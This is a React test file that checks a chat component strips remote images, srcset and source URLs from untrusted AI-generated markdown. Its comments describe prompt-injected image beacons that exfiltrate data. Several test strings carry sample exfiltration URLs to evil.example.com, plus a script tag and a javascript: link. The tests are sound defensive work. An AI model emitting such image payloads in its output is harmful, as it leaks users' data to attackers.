import { render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { isAllowedMediaUrl, MessageResponse } from "./message";

// AI replies are untrusted markdown: a prompt-injected remote image or
// `srcset` must not auto-load, since the request itself (query string,
// headers) can leak data the moment the browser fetches it — no click
// required. Relative and same-origin images still work (avatars, attachments
// served by us); links stay clickable (Streamdown's own link-safety modal
// gates those).

// `isAllowedMediaUrl` is the fail-closed same-origin decision the rehype
// plugin applies to every `src`/`poster`. Unit-tested directly because
// Streamdown's own default pipeline independently blocks some of the same
// inputs before the plugin ever runs (see the `data:` case below), which
// would make an end-to-end render an incomplete test of the decision itself.
describe("isAllowedMediaUrl", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("allows a relative path", () => {
    expect(isAllowedMediaUrl("/static/avatar.png")).toBe(true);
  });

  it("allows a same-origin absolute URL", () => {
    expect(
      isAllowedMediaUrl(`${window.location.origin}/static/avatar.png`),
    ).toBe(true);
  });

  it("rejects a cross-origin absolute URL", () => {
    expect(isAllowedMediaUrl("https://evil.example.com/exfil.png")).toBe(false);
  });

  it("rejects a protocol-relative URL to a different host", () => {
    expect(isAllowedMediaUrl("//evil.example.com/exfil.png")).toBe(false);
  });

  // Chosen to allow data: URIs rather than treat every non-relative scheme
  // as remote: the URL *is* the image data, so loading one makes no network
  // request and can't exfiltrate anything.
  it("allows a data: URI unconditionally", () => {
    expect(
      isAllowedMediaUrl("data:image/png;base64,iVBORw0KGgoAAAANSUhEUg=="),
    ).toBe(true);
  });

  // No special-case exemption for blob: — it goes through the same
  // same-origin rule as any other URL. A same-origin-looking blob: URL is
  // harmless either way (it can only resolve if the object actually exists
  // in this page's memory; a fabricated one 404s), but a cross-origin one is
  // rejected like any other cross-origin src.
  it("rejects a blob: URL whose embedded origin differs from this page's", () => {
    expect(
      isAllowedMediaUrl(
        "blob:https://evil.example.com/1b6a6e0e-0000-4000-8000-000000000000",
      ),
    ).toBe(false);
  });

  it("allows a blob: URL whose embedded origin matches this page's", () => {
    expect(
      isAllowedMediaUrl(
        `blob:${window.location.origin}/1b6a6e0e-0000-4000-8000-000000000000`,
      ),
    ).toBe(true);
  });

  it("fails closed when window is unavailable (SSR)", () => {
    vi.stubGlobal("window", undefined);
    expect(isAllowedMediaUrl("/static/avatar.png")).toBe(false);
  });

  it("fails closed on a URL that fails to parse", () => {
    expect(isAllowedMediaUrl("http://[not-a-valid-host")).toBe(false);
  });
});

describe("MessageResponse images", () => {
  it("drops a remote image entirely so it never auto-loads", () => {
    // Streamdown's image component renders nothing when src is falsy, so
    // dropping the src removes the <img> outright rather than leaving a
    // broken/empty-src element behind.
    const { container } = render(
      <MessageResponse>
        {"![leak](https://evil.example.com/exfil.png?d=secret)"}
      </MessageResponse>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("keeps a relative image's src", () => {
    const { container } = render(
      <MessageResponse>{"![avatar](/static/avatar.png)"}</MessageResponse>,
    );
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe("/static/avatar.png");
  });

  it("keeps a same-origin absolute image's src", () => {
    const { container } = render(
      <MessageResponse>
        {`![avatar](${window.location.origin}/static/avatar.png)`}
      </MessageResponse>,
    );
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe(
      `${window.location.origin}/static/avatar.png`,
    );
  });

  it("keeps a remote link (Streamdown renders it as a link-safety button, not stripped)", () => {
    render(
      <MessageResponse>{"[docs](https://evil.example.com/x)"}</MessageResponse>,
    );
    expect(screen.getByText("docs")).toBeInTheDocument();
  });

  // `urlTransform` can't see these: html-url-attributes (the fixed property
  // list it runs against) has no `srcSet` entry, so `<picture><source
  // srcset="...">` bypasses a urlTransform-only fix entirely. Confirmed by
  // reading the installed html-url-attributes@3.0.1 source (urlAttributes
  // map has no `srcSet`/`srcset` key) and hast-util-sanitize@5.0.2's
  // defaultSchema (`source: ['srcSet']` is allowed with no entry in
  // `protocols`, so no scheme/origin check applies to it either). This is
  // why the fix runs as a rehype plugin on the sanitized hast tree instead
  // of via `urlTransform`.
  it("drops <source srcset> inside <picture> and keeps the fallback <img>", () => {
    const { container } = render(
      <MessageResponse>
        {
          '<picture><source srcset="https://evil.example.com/exfil.png?d=secret"><img src="/ok.png" alt="ok"></picture>'
        }
      </MessageResponse>,
    );
    const source = container.querySelector("source");
    expect(source?.getAttribute("srcset")).toBeNull();
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe("/ok.png");
  });

  it("drops a protocol-relative src on <source> (a tag Streamdown's own harden plugin never inspects)", () => {
    // Reading the installed rehype-harden@1.1.8 source: its visitor only
    // has branches for tagName "a" and "img" — "source"/"picture" pass
    // through completely unchecked by Streamdown's own defaults, so this
    // case exercises *our* plugin specifically, not harden's img-only
    // protocol-relative mitigation (see the <img> case below).
    const { container } = render(
      <MessageResponse>
        {
          '<picture><source src="//evil.example.com/exfil.png"><img src="/ok.png" alt="ok"></picture>'
        }
      </MessageResponse>,
    );
    const source = container.querySelector("source");
    expect(source?.getAttribute("src") ?? "").not.toContain("evil.example.com");
  });

  it("drops srcset on a plain <img>", () => {
    const { container } = render(
      <MessageResponse>
        {
          '<img src="/ok.png" srcset="https://evil.example.com/exfil.png 1x" alt="ok">'
        }
      </MessageResponse>,
    );
    const img = container.querySelector("img");
    expect(img?.getAttribute("srcset")).toBeNull();
    expect(img?.getAttribute("src")).toBe("/ok.png");
  });

  it("neutralizes a protocol-relative <img> src (no evil host reaches the DOM)", () => {
    // Streamdown's own `rehype-harden` already collapses a protocol-relative
    // <img> src down to a host-less relative path before our plugin runs
    // (verified by reading rehype-harden@1.1.8's transformUrl: it treats any
    // src starting with "/" — including "//host/path" — as
    // `inputWasRelative` and returns only `pathname + search + hash`). Our
    // plugin then sees an already-relative value and allows it, same as any
    // other relative src. Either mechanism is safe; asserting on the
    // observable outcome (no attacker host in the DOM) rather than on which
    // layer did it, since that's what actually matters here.
    const { container } = render(
      <MessageResponse>
        {'<img src="//evil.example.com/exfil.png" alt="leak">'}
      </MessageResponse>,
    );
    const img = container.querySelector("img");
    expect(img?.getAttribute("src") ?? "").not.toContain("evil.example.com");
  });

  it("drops a raw <img src> pointed at a remote origin", () => {
    const { container } = render(
      <MessageResponse>
        {'<img src="https://evil.example.com/exfil.png" alt="leak">'}
      </MessageResponse>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("drops a blob: image src from a different origin (no blanket exemption for blob:)", () => {
    const { container } = render(
      <MessageResponse>
        {
          '<img src="blob:https://evil.example.com/1b6a6e0e-0000-4000-8000-000000000000" alt="leak">'
        }
      </MessageResponse>,
    );
    expect(container.querySelector("img")).toBeNull();
  });

  // Not testable end to end as "kept": reading the installed
  // hast-util-sanitize@5.0.2 + rehype-harden@1.1.8 pipeline shows sanitize's
  // defaultSchema restricts the `src` protocol to `['http', 'https']` and
  // runs *before* harden, so it strips a `data:` `src` outright — harden's
  // own `allowDataImages: true` (which Streamdown sets by default) never
  // gets a chance to apply, and our plugin (which runs after both) never
  // sees the attribute either. Our plugin's own decision to allow `data:`
  // (see the `isAllowedMediaUrl` unit tests above) is real and correct as
  // defense in depth, but can't be observed through a full render given the
  // installed library versions — documenting that here instead of asserting
  // something the current dependency chain can't produce.
  it("documents that data: images are blocked upstream of our plugin by Streamdown's own sanitize step", () => {
    const dataUrl = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB";
    render(
      <MessageResponse>{`<img src="${dataUrl}" alt="pixel">`}</MessageResponse>,
    );
    expect(screen.getByText("[Image blocked: pixel]")).toBeInTheDocument();
  });

  it("still strips <script> and neutralizes a javascript: link (confirms appending to defaultRehypePlugins kept Streamdown's own sanitize/harden, rather than replacing them)", () => {
    const { container } = render(
      <MessageResponse>
        {
          "<script>window.__pwned = true;</script>\n\n[click me](javascript:alert(1))"
        }
      </MessageResponse>,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.innerHTML).not.toContain("javascript:alert");
  });
});
